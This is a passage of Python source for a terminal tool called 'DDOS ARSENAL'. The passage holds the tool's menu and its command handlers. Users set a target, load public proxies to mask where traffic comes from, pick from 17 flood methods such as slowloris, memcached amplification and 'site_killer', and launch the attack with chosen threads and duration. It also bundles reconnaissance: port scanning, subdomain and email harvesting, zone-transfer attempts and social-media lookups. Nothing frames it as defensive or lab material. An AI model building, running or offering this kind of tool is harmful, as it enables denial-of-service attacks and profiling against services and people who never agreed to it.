            pad = max(0, (w - len(status_line.replace(status_color, '').replace(Style.RESET_ALL, ''))) // 2)
            print(' ' * pad + status_line)
            
            author_line = f"{C()}{AUTHOR} | {VERSION}{Style.RESET_ALL}"
            pad = max(0, (w - len(author_line.replace(C(), '').replace(Style.RESET_ALL, ''))) // 2)
            print(' ' * pad + author_line)
            
            quote = self.get_quote()
            quote_line = f"{C()}{quote}{Style.RESET_ALL}"
            pad = max(0, (w - len(quote_line.replace(C(), '').replace(Style.RESET_ALL, ''))) // 2)
            print(' ' * pad + quote_line)
            
            progress = (frame + 1) / 60
            bar_len = min(50, w - 20)
            filled = int(bar_len * progress)
            bar = '█' * filled + '░' * (bar_len - filled)
            pct = int(progress * 100)
            bar_line = f"{C()}[{bar}] {pct}%{Style.RESET_ALL}"
            pad = max(0, (w - len(bar_line.replace(C(), '').replace(Style.RESET_ALL, ''))) // 2)
            print(' ' * pad + bar_line)
            
            if frame >= 57:
                enter = f"{B()}PRESS ENTER TO CONTINUE{Style.RESET_ALL}"
                pad = max(0, (w - len(enter.replace(B(), '').replace(Style.RESET_ALL, ''))) // 2)
                print('\n' + ' ' * pad + enter)
            
            time.sleep(0.03)
    
    def show_menu(self):
        w, _ = get_terminal_size()
        menu_width = min(110, max(80, w - 8))
        quote = self.get_quote()
        current_method = self.ddos.method.upper()

        header_panel = Panel(
            f"[bold white]DDOS ARSENAL[/bold white]\n"
            f"[dim white]Ultimate Maximum v.1.0.0[/dim white]\n\n"
            f"[green]Method:[/green] [bold]{current_method}[/bold]    "
            f"[green]Proxies:[/green] [bold]{len(self.ddos.proxies)}[/bold]    "
            f"[green]Threads:[/green] [bold]{self.ddos.threads}[/bold]\n\n"
            f"[dim]{quote}[/dim]",
            title=f"[bold {CURRENT_SCHEME}]MAIN MENU[/bold {CURRENT_SCHEME}]",
            border_style=CURRENT_SCHEME,
            width=menu_width,
            padding=(1, 2),
        )

        menu_items = [
            "[bold cyan]1.[/bold cyan] SET TARGET (DOMAIN/IP / PORT)",
            "[bold cyan]2.[/bold cyan] LOAD PROXIES FROM INTERNET (8+ SOURCES)",
            f"[bold cyan]3.[/bold cyan] SELECT ATTACK METHOD (CURRENT: [bold]{current_method}[/bold])",
            "[bold cyan]4.[/bold cyan] LAUNCH ATTACK (16 METHODS)",
            "[bold cyan]5.[/bold cyan] FULL OSINT REPORT (DNS, WHOIS, GEO, SSL)",
            "[bold cyan]6.[/bold cyan] ADVANCED PORT SCANNER (400+ PORTS)",
            "[bold cyan]7.[/bold cyan] WEB ANALYZER (TECHNOLOGIES, EMAILS, URLS)",
            "[bold cyan]8.[/bold cyan] SUBDOMAIN ENUMERATOR (300+ SUBDOMAINS)",
            "[bold cyan]9.[/bold cyan] SOCIAL MEDIA SEARCH (35+ PLATFORMS)",
            "[bold cyan]10.[/bold cyan] EMAIL EXTRACTOR (WEB + COMMON PATTERNS)",
            "[bold cyan]11.[/bold cyan] SSL/TLS CERTIFICATE ANALYZER",
            "[bold cyan]12.[/bold cyan] IP RANGE CALCULATOR (CIDR, NETMASK, BROADCAST)",
            "[bold cyan]13.[/bold cyan] DNS ENUMERATOR (ALL RECORD TYPES)",
            "[bold cyan]14.[/bold cyan] WHOIS LOOKUP (DOMAIN OR IP)",
            "[bold cyan]15.[/bold cyan] DNS ZONE TRANSFER ATTEMPT",
            "[bold cyan]16.[/bold cyan] CVE SCANNER (SIMULATED)",
            "[bold cyan]17.[/bold cyan] HONEYPOT DETECTOR",
            "[bold cyan]18.[/bold cyan] BACKUP FILE SCANNER",
            "[bold cyan]19.[/bold cyan] COOKIE ANALYZER",
            "[bold cyan]20.[/bold cyan] WAF DETECTOR",
            "[bold cyan]21.[/bold cyan] CHANGE COLOR SCHEME (12 COLORS)",
            "[bold cyan]22.[/bold cyan] STATISTICS & PERFORMANCE",
            "[bold cyan]23.[/bold cyan] EXPORT REPORT (TEXT + JSON)",
            "[bold cyan]24.[/bold cyan] EXIT",
        ]

        grid = Table.grid(padding=(0, 2))
        grid.add_column(ratio=1)
        grid.add_column(ratio=1)

        for i in range(0, len(menu_items), 2):
            left = menu_items[i]
            right = menu_items[i + 1] if i + 1 < len(menu_items) else ''
            grid.add_row(left, right)

        menu_panel = Panel(
            grid,
            title="[bold white]OPTIONS[/bold white]",
            border_style="bright_blue",
            width=menu_width,
            padding=(1, 2),
        )

        footer_panel = Panel(
            f"[bold]{AUTHOR}[/bold] | [yellow]{VERSION}[/yellow] | "
            f"[green]{len(self.ddos.proxies)} proxies[/green] | "
            f"[cyan]{self.ddos.threads} threads[/cyan] | "
            f"[magenta]Theme: {CURRENT_SCHEME.capitalize()}[/magenta]",
            border_style="dim",
            width=menu_width,
            padding=(0, 2),
        )

        console.print(header_panel)
        console.print(menu_panel)
        console.print(footer_panel)
        print()

    def cmd_set_target(self):
        target = input(f"{C()}ENTER TARGET (DOMAIN/IP/URL): {Style.RESET_ALL}").strip()
        if not target:
            return
        port = input(f"{C()}ENTER PORT (default 80): {Style.RESET_ALL}").strip()
        try:
            port = int(port) if port else 80
            self.ddos.set_target(target, port)
            self.current_target = Target(target)
            self.current_target.port = port
            self.current_target._analyze()
            logger.success(f"Target resolved: {self.current_target.ip}")
        except:
            logger.error("Invalid port")
    
    def cmd_load_proxies(self):
        if not check_internet():
            logger.error("No internet connection!")
            return
        proxies = self.proxy_manager.load_proxies()
        if proxies:
            logger.info("Validating proxies...")
            valid = self.proxy_manager.validate_proxies(count=100)
            self.ddos.set_proxies(valid)
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_select_method(self):
        methods = ['udp', 'tcp', 'tcp_ack', 'tcp_rst', 'http', 'http_post', 'https', 'dns', 
                   'ntp', 'memcached', 'slowloris', 'rudy', 'apache_killer', 'http2_rapid', 
                   'provider_killer', 'site_killer', 'mixed']
        console.print("[bold cyan]ATTACK METHODS (17):[/bold cyan]")
        for i, m in enumerate(methods, 1):
            console.print(f"  {i:2}. {m.upper()}")
        try:
            sel = int(input(f"{C()}SELECT (1-{len(methods)}): {Style.RESET_ALL}").strip())
            if 1 <= sel <= len(methods):
                self.ddos.method = methods[sel-1]
                logger.success(f"Method set to {self.ddos.method.upper()}")
        except:
            logger.error("Invalid selection")
        time.sleep(1)
    
    def cmd_launch_attack(self):
        if not self.ddos.target_ip or not self.ddos.target_port:
            logger.error("Set target first!")
            time.sleep(1)
            return
        if len(self.ddos.proxies) < 3:
            logger.error("Load proxies first!")
            time.sleep(1)
            return
        
        dur = input(f"{C()}ATTACK DURATION (seconds, 0=infinite): {Style.RESET_ALL}").strip()
        try:
            self.ddos.duration = int(dur)
        except:
            self.ddos.duration = 0
        
        threads = input(f"{C()}THREADS (default {self.ddos.threads}): {Style.RESET_ALL}").strip()
        try:
            self.ddos.threads = int(threads) if threads else self.ddos.threads
        except:
            pass
        
        packet = input(f"{C()}PACKET SIZE (default {self.ddos.packet_size}): {Style.RESET_ALL}").strip()
        try:
            self.ddos.packet_size = int(packet) if packet else self.ddos.packet_size
        except:
            pass
        
        result = self.ddos.launch()
        if result:
            self.report.add_section('attack_results', result)
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_osint(self):
        target = input(f"{C()}ENTER TARGET (DOMAIN/IP): {Style.RESET_ALL}").strip()
        if not target:
            return
        
        t = Target(target)
        logger.info(f"Running OSINT on {target}")
        
        with tqdm(total=7, desc="OSINT Scanning") as pbar:
            t.get_dns()
            pbar.update(1)
            t.get_whois()
            pbar.update(1)
            t.get_geo()
            pbar.update(1)
            t.get_ssl()
            pbar.update(1)
            t.get_headers()
            pbar.update(1)
            t.scan_ports()
            pbar.update(1)
            t.get_technologies()
            pbar.update(1)
        
        console.print(Panel.fit("[bold cyan]OSINT REPORT[/bold cyan]", border_style="cyan"))
        
        if t.ip:
            console.print(f"[bold]IP:[/bold] {t.ip}")
        if t.domain:
            console.print(f"[bold]Domain:[/bold] {t.domain}")
        
        if t.geo_data:
            geo = t.geo_data
            console.print(Panel(
                f"🌍 Country: {geo.get('country')}\n"
                f"🏙️ City: {geo.get('city')}\n"
                f"📡 ISP: {geo.get('isp')}\n"
                f"🔢 AS: {geo.get('as')}",
                title="Geolocation",
                border_style="green"
            ))
        
        if t.whois_data:
            whois_data = t.whois_data
            console.print(Panel(
                f"📋 Registrar: {whois_data.get('registrar')}\n"
                f"📅 Created: {whois_data.get('creation_date')}\n"
                f"⏳ Expires: {whois_data.get('expiration_date')}",
                title="WHOIS",
                border_style="yellow"
            ))
        
        if t.ssl_cert:
            cert = t.ssl_cert
            console.print(Panel(
                f"🔒 Issuer: {cert.get('issuer', {}).get('organizationName', 'N/A')}\n"
                f"📆 Valid: {cert.get('notBefore')} to {cert.get('notAfter')}",
                title="SSL Certificate",
                border_style="cyan"
            ))
        
        if t.open_ports:
            console.print(Panel(
                "\n".join([f"  {p}: {get_service_name(p)}" for p in t.open_ports[:20]]),
                title=f"Open Ports ({len(t.open_ports)})",
                border_style="magenta"
            ))
        
        if t.technologies:
            console.print(Panel(
                "\n".join([f"  - {tech}" for tech in t.technologies]),
                title="Technologies",
                border_style="blue"
            ))
        
        self.results['osint'] = t.__dict__
        self.report.add_section('osint', self.results['osint'])
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_port_scanner(self):
        ip = input(f"{C()}ENTER IP TO SCAN: {Style.RESET_ALL}").strip()
        if not ip:
            return
        if not validate_ip(ip):
            resolved = resolve_domain(ip)
            if resolved:
                ip = resolved
                logger.success(f"Resolved to: {ip}")
            else:
                logger.error("Invalid IP or domain")
                return
        
        scanner = AdvancedPortScanner(ip)
        scanner.scan_all()
        report = scanner.get_report()
        
        console.print(Panel.fit("[bold cyan]PORT SCAN REPORT[/bold cyan]", border_style="cyan"))
        table = Table(title=f"Open Ports on {ip}")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="green")
        table.add_column("Banner", style="white")
        
        for item in report:
            table.add_row(str(item['port']), item['service'], truncate_string(item['banner'], 30))
        
        console.print(table)
        
        self.results['port_scan'] = report
        self.report.add_section('port_scan', report)
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_web_analyzer(self):
        target = input(f"{C()}ENTER URL OR DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        analyzer = WebAnalyzer(target)
        data = analyzer.analyze()
        
        if data:
            console.print(Panel.fit("[bold cyan]WEB ANALYSIS REPORT[/bold cyan]", border_style="cyan"))
            console.print(Panel(
                f"🌐 URL: {data.get('url')}\n"
                f"📊 Status: {data.get('status')}\n"
                f"🖥️ Server: {data.get('server')}\n"
                f"📌 Title: {data.get('title')}\n"
                f"📦 Size: {data.get('content_length', 0)} bytes\n"
                f"⏱️ Response Time: {data.get('response_time', 0):.3f}s",
                title="Overview",
                border_style="green"
            ))
            
            if data.get('emails'):
                console.print(Panel(
                    "\n".join([f"  - {email}" for email in data['emails'][:20]]),
                    title=f"📧 Emails ({len(data['emails'])})",
                    border_style="magenta"
                ))
            
            if data.get('links'):
                console.print(Panel(
                    "\n".join([f"  - {link}" for link in data['links'][:20]]),
                    title=f"🔗 Links ({len(data['links'])})",
                    border_style="blue"
                ))
            
            self.results['web'] = data
            self.report.add_section('web', data)
        else:
            logger.error("Web analysis failed")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_subdomain_enum(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        enumerator = SubdomainEnumerator(target)
        results = enumerator.enumerate()
        
        if results:
            console.print(Panel.fit("[bold cyan]SUBDOMAIN ENUMERATION[/bold cyan]", border_style="cyan"))
            table = Table(title=f"Subdomains for {target}")
            table.add_column("Domain", style="cyan")
            table.add_column("IP", style="white")
            
            for sub in results[:50]:
                table.add_row(sub['domain'], sub['ip'])
            
            console.print(table)
            if len(results) > 50:
                console.print(f"[yellow]... and {len(results) - 50} more[/yellow]")
            
            self.results['subdomains'] = results
            self.report.add_section('subdomains', results)
        else:
            logger.error("No subdomains found")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_social_search(self):
        target = input(f"{C()}ENTER USERNAME OR DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        searcher = SocialMediaSearcher(target)
        results = searcher.search_all()
        
        console.print(Panel.fit("[bold cyan]SOCIAL MEDIA SEARCH[/bold cyan]", border_style="cyan"))
        found = [p for p, d in results.items() if d.get('found')]
        
        if found:
            console.print(Panel(
                "\n".join([f"[green]✓ {p.capitalize()}[/green]" for p in found]),
                title=f"Found ({len(found)})",
                border_style="green"
            ))
        
        self.results['social'] = results
        self.report.add_section('social', results)
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_email_extractor(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        extractor = EmailExtractor(target)
        emails = extractor.extract_all()
        
        if emails:
            console.print(Panel.fit("[bold cyan]EMAIL EXTRACTION[/bold cyan]", border_style="cyan"))
            console.print(Panel(
                "\n".join([f"  - {email}" for email in sorted(emails)[:30]]),
                title=f"📧 Emails ({len(emails)})",
                border_style="magenta"
            ))
            self.results['emails'] = emails
            self.report.add_section('emails', emails)
        else:
            logger.error("No emails found")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_ssl_analyzer(self):
        target = input(f"{C()}ENTER DOMAIN OR IP: {Style.RESET_ALL}").strip()
        if not target:
            return
        port = input(f"{C()}ENTER PORT (default 443): {Style.RESET_ALL}").strip()
        port = int(port) if port else 443
        
        cert = get_ssl_certificate(target, port)
        
        if cert:
            console.print(Panel.fit("[bold cyan]SSL/TLS CERTIFICATE[/bold cyan]", border_style="cyan"))
            console.print(Panel(
                f"🔒 Subject CN: {cert.get('subject', {}).get('commonName', 'N/A')}\n"
                f"🏢 Issuer CN: {cert.get('issuer', {}).get('commonName', 'N/A')}\n"
                f"📅 Valid From: {cert.get('notBefore')}\n"
                f"📅 Valid Until: {cert.get('notAfter')}\n"
                f"🔢 Serial: {cert.get('serialNumber')}",
                title="Certificate Info",
                border_style="cyan"
            ))
            
            if cert.get('subjectAltName'):
                console.print(Panel(
                    "\n".join([f"  - {alt}" for alt in cert['subjectAltName'][:10]]),
                    title="Subject Alternative Names",
                    border_style="green"
                ))
            
            self.results['ssl'] = cert
            self.report.add_section('ssl', cert)
        else:
            logger.error("SSL analysis failed")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_ip_range(self):
        ip_input = input(f"{C()}ENTER IP OR NETWORK (e.g., 192.168.1.0/24): {Style.RESET_ALL}").strip()
        if not ip_input:
            return
        
        try:
            if '/' in ip_input:
                network = ipaddress.ip_network(ip_input, strict=False)
            else:
                cidr = input(f"{C()}ENTER CIDR (default 24): {Style.RESET_ALL}").strip()
                cidr = int(cidr) if cidr else 24
                network = ipaddress.ip_network(f'{ip_input}/{cidr}', strict=False)
            
            console.print(Panel.fit("[bold cyan]IP RANGE CALCULATOR[/bold cyan]", border_style="cyan"))
            console.print(Panel(
                f"🌐 Network: {network}\n"
                f"🎭 Netmask: {network.netmask}\n"
                f"🌐 Wildcard: {network.hostmask}\n"
                f"📡 Broadcast: {network.broadcast_address}\n"
                f"🖥️ Total Hosts: {network.num_addresses}\n"
                f"📊 Usable Hosts: {network.num_addresses - 2}\n"
                f"🔢 First Host: {list(network.hosts())[0] if network.num_addresses > 2 else 'N/A'}\n"
                f"🔢 Last Host: {list(network.hosts())[-1] if network.num_addresses > 2 else 'N/A'}",
                title="IP Network Information",
                border_style="cyan"
            ))
            
            self.results['ip_range'] = {
                'network': str(network),
                'netmask': str(network.netmask),
                'wildcard': str(network.hostmask),
                'broadcast': str(network.broadcast_address),
                'total_hosts': network.num_addresses,
                'usable_hosts': network.num_addresses - 2,
            }
            self.report.add_section('ip_range', self.results['ip_range'])
        except Exception as e:
            logger.error(f"Invalid input: {e}")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_dns_enum(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        records = {}
        for r in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'SRV', 'PTR', 'CAA', 'DS', 'DNSKEY']:
            records[r] = get_dns_records(target, r)
        
        console.print(Panel.fit("[bold cyan]DNS ENUMERATION[/bold cyan]", border_style="cyan"))
        table = Table(title=f"DNS Records for {target}")
        table.add_column("Record Type", style="cyan")
        table.add_column("Values", style="white")
        
        for r, values in records.items():
            if values:
                table.add_row(r, '\n'.join(values[:3]))
        
        console.print(table)
        
        self.results['dns'] = records
        self.report.add_section('dns', records)
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_whois(self):
        target = input(f"{C()}ENTER DOMAIN OR IP: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        whois_data = get_whois(target) if not validate_ip(target) else None
        
        if not whois_data and validate_ip(target):
            try:
                response = requests.get(f'https://ipwhois.app/json/{target}', timeout=5)
                if response.status_code == 200:
                    whois_data = response.json()
            except:
                pass
        
        if whois_data:
            console.print(Panel.fit("[bold cyan]WHOIS LOOKUP[/bold cyan]", border_style="cyan"))
            console.print(Panel(
                "\n".join([f"{k}: {v}" for k, v in whois_data.items() if v]),
                title=f"WHOIS for {target}",
                border_style="yellow"
            ))
            self.results['whois'] = whois_data
            self.report.add_section('whois', whois_data)
        else:
            logger.error("WHOIS lookup failed")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_dns_zone_transfer(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        result = dns_zone_transfer(target)
        
        console.print(Panel.fit("[bold cyan]DNS ZONE TRANSFER[/bold cyan]", border_style="cyan"))
        if result:
            console.print(Panel(
                json.dumps(result, indent=2, default=str)[:2000],
                title="Zone Transfer Successful",
                border_style="green"
            ))
            self.results['zone_transfer'] = result
            self.report.add_section('zone_transfer', result)
        else:
            console.print("[yellow]Zone transfer failed (likely secured)[/yellow]")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_cve_scanner(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        cves = cve_scanner(target)
        
        console.print(Panel.fit("[bold cyan]CVE SCANNER[/bold cyan]", border_style="cyan"))
        if cves:
            console.print(Panel(
                "\n".join([f"  - {cve}" for cve in cves]),
                title=f"Potential CVEs ({len(cves)})",
                border_style="red"
            ))
            self.results['cves'] = cves
            self.report.add_section('cves', cves)
        else:
            console.print("[green]No known CVEs detected[/green]")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_honeypot_detector(self):
        ip = input(f"{C()}ENTER IP: {Style.RESET_ALL}").strip()
        if not ip:
            return
        if not validate_ip(ip):
            resolved = resolve_domain(ip)
            if resolved:
                ip = resolved
                logger.success(f"Resolved to: {ip}")
            else:
                logger.error("Invalid IP")
                return
        
        result = honeypot_detector(ip)
        
        console.print(Panel.fit("[bold cyan]HONEYPOT DETECTOR[/bold cyan]", border_style="cyan"))
        console.print(Panel(
            f"🕵️ Is Honeypot: {result['is_honeypot']}\n"
            f"📋 Indicators: {', '.join(result['indicators']) if result['indicators'] else 'None'}",
            title=f"Analysis for {ip}",
            border_style="yellow"
        ))
        
        self.results['honeypot'] = result
        self.report.add_section('honeypot', result)
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_backup_scanner(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        backups = backup_scanner(target)
        
        console.print(Panel.fit("[bold cyan]BACKUP FILE SCANNER[/bold cyan]", border_style="cyan"))
        if backups:
            console.print(Panel(
                "\n".join([f"  - {b['file']} (Size: {b['size']})" for b in backups]),
                title=f"Backups Found ({len(backups)})",
                border_style="red"
            ))
            self.results['backups'] = backups
            self.report.add_section('backups', backups)
        else:
            console.print("[green]No backup files found[/green]")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_cookie_analyzer(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        cookies = cookie_analyzer(target)
        
        console.print(Panel.fit("[bold cyan]COOKIE ANALYZER[/bold cyan]", border_style="cyan"))
        if cookies:
            table = Table(title=f"Cookies for {target}")
            table.add_column("Name", style="cyan")
            table.add_column("Secure", style="green")
            table.add_column("HttpOnly", style="yellow")
            table.add_column("SameSite", style="magenta")
            
            for name, info in cookies.items():
                table.add_row(
                    name,
                    str(info.get('secure', False)),
                    str(info.get('httponly', False)),
                    info.get('samesite', 'None')
                )
            console.print(table)
            self.results['cookies'] = cookies
            self.report.add_section('cookies', cookies)
        else:
            console.print("[yellow]No cookies found[/yellow]")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_waf_detector(self):
        target = input(f"{C()}ENTER DOMAIN: {Style.RESET_ALL}").strip()
        if not target:
            return
        
        waf = waf_detector(target)
        
        console.print(Panel.fit("[bold cyan]WAF DETECTOR[/bold cyan]", border_style="cyan"))
        if waf:
            console.print(Panel(
                "\n".join([f"  - {w}" for w in waf]),
                title="WAF Detected",
                border_style="yellow"
            ))
            self.results['waf'] = waf
            self.report.add_section('waf', waf)
        else:
            console.print("[green]No WAF detected[/green]")
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_change_color(self):
        console.print(Panel.fit("[bold cyan]COLOR SCHEMES (12)[/bold cyan]", border_style="cyan"))
        colors = list(COLOR_SCHEMES.keys())
        for i, color in enumerate(colors, 1):
            col = COLOR_SCHEMES[color]['main']
            console.print(f"{i}. {col}{color.capitalize()}{Style.RESET_ALL}")
        
        try:
            choice = int(input(f"{C()}SELECT COLOR (1-{len(colors)}): {Style.RESET_ALL}").strip())
            if 1 <= choice <= len(colors):
                if set_color(colors[choice - 1]):
                    logger.success(f"Color changed to {colors[choice - 1].capitalize()}")
        except:
            pass
    
    def cmd_statistics(self):
        console.print(Panel.fit("[bold cyan]STATISTICS[/bold cyan]", border_style="cyan"))
        
        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("Metric", style="yellow")
        table.add_column("Value", style="white")
        
        table.add_row("🎯 Target", f"{self.ddos.target_domain or self.ddos.target_ip}:{self.ddos.target_port}")
        table.add_row("📡 Proxies", str(len(self.ddos.proxies)))
        table.add_row("🧵 Threads", str(self.ddos.threads))
        table.add_row("⚡ Method", self.ddos.method.upper())
        table.add_row("📊 Total Requests", str(self.ddos.requests))
        table.add_row("💾 Data Sent", f"{self.ddos.bytes_sent/1024/1024:.2f} MB")
        table.add_row("❌ Errors", str(self.ddos.errors))
        
        if self.ddos.start_time > 0:
            elapsed = time.time() - self.ddos.start_time
            rate = self.ddos.requests / elapsed if elapsed > 0 else 0
            table.add_row("⏱️ Elapsed Time", f"{elapsed:.1f}s")
            table.add_row("🚀 Average Rate", f"{rate:.0f} req/s")
        
        console.print(table)
        
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_export_report(self):
        if not self.report.report:
            logger.error("No data to export. Run some scans first.")
            input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
            return
        
        filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.report.save_text(f"{filename}.txt")
        self.report.save_json(f"{filename}.json")
        
        logger.success(f"Reports saved: {filename}.txt and {filename}.json")
        input(f"{C()}PRESS ENTER...{Style.RESET_ALL}")
    
    def cmd_exit(self):
        console.print(f"\n[bold red]DDOS ARSENAL TERMINATED[/bold red]")
        console.print(f"[cyan]AUTHOR: {AUTHOR}[/cyan]")
        console.print(f"[cyan]VERSION: {VERSION}[/cyan]")
        console.print(f"[cyan]FINAL QUOTE: {random.choice(QUOTES)}[/cyan]")
        sys.exit(0)
    
    # ====== MAIN LOOP ======
    
    def main_loop(self):
        self.animate_logo()
        try:
            input()
        except:
            pass
        
        commands = {
            '1': self.cmd_set_target,
            '2': self.cmd_load_proxies,
            '3': self.cmd_select_method,
            '4': self.cmd_launch_attack,
            '5': self.cmd_osint,
            '6': self.cmd_port_scanner,
            '7': self.cmd_web_analyzer,
            '8': self.cmd_subdomain_enum,
            '9': self.cmd_social_search,
            '10': self.cmd_email_extractor,
            '11': self.cmd_ssl_analyzer,
            '12': self.cmd_ip_range,
            '13': self.cmd_dns_enum,
            '14': self.cmd_whois,
            '15': self.cmd_dns_zone_transfer,
            '16': self.cmd_cve_scanner,
            '17': self.cmd_honeypot_detector,
            '18': self.cmd_backup_scanner,
            '19': self.cmd_cookie_analyzer,
            '20': self.cmd_waf_detector,
            '21': self.cmd_change_color,
            '22': self.cmd_statistics,
            '23': self.cmd_export_report,
            '24': self.cmd_exit,
        }
        
        while True:
            clear_screen()
            self.show_menu()
            
            try:
                choice = input(f"{C()}SELECT ACTION (1-24): {Style.RESET_ALL}").strip()
            except KeyboardInterrupt:
                print(f"\n{C()}[!] EXITING...{Style.RESET_ALL}")
                break
            except:
                choice = ''
            
            if choice in commands:
                commands[choice]()
            else:
                logger.error("Invalid choice")
                time.sleep(1)

# ================================================================
# HELPER FUNCTION
# ================================================================

def get_service_name(port):
    common = {
        20: 'FTP-data', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
        53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC', 123: 'NTP',
        135: 'MSRPC', 137: 'NetBIOS', 139: 'NetBIOS', 143: 'IMAP',
        161: 'SNMP', 179: 'BGP', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB',
        465: 'SMTPS', 514: 'Syslog', 587: 'SMTP', 631: 'IPP',
        636: 'LDAPS', 873: 'Rsync', 993: 'IMAPS', 995: 'POP3S',
        1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
        1900: 'UPnP', 2049: 'NFS', 3306: 'MySQL', 3389: 'RDP',
        5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
        8080: 'HTTP Proxy', 8443: 'HTTPS', 11211: 'Memcached', 27017: 'MongoDB'
    }
    return common.get(port, 'Unknown')

# ================================================================
# RUN APPLICATION
# ================================================================

if __name__ == "__main__":
    try:
        app = Application()
        app.main_loop()
    except KeyboardInterrupt:
        console.print(f"\n[bold red]FORCED EXIT[/bold red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]ERROR: {e}[/bold red]")
        traceback.print_exc()
        sys.exit(1)
